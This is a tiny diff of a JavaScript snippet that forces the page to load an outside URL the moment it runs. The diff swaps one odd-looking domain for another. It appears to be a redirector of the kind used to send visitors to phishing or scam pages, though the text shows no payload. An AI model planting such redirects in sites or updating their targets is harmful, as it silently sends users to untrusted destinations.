@@ -1,3 +1,4 @@
 (function() {
-    window['location'] = 'https://tes.teamsetel.icu/';
+    window['location'] = 'https://letyselvp1.vercel.app/';
 })();
+
